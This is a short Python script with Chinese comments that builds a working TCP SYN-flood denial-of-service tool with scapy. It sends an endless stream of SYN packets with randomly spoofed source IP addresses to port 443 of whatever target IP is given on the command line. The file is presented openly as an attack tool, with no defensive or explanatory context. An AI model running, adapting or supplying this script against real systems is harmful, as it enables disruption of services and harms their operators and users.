import sys
from scapy.all import *

def start(target_ip):
    """
    开始进行TCP的DoS攻击
    :param target_ip: 目标IP地址
    """
    try:
        # 无限循环发送TCP SYN数据包
        while True:
            # 生成随机的源IP地址
            src_ip = RandIP()
            # 构造IP层和TCP层的数据包，目标端口为443，标志位为SYN
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=443, flags="S")
            # 发送数据包
            send(packet, verbose=0)
    except KeyboardInterrupt:
        print("用户中断操作，正在终止所有线程...")

if __name__ == '__main__':
    # 检查命令行参数数量是否足够
    if len(sys.argv) < 2:
        print(f"{sys.argv[0]}  <目标IP地址>")
        sys.exit(0)
    # 获取目标IP地址
    target_ip = sys.argv[1]
    # 调用start函数开始攻击
    start(target_ip)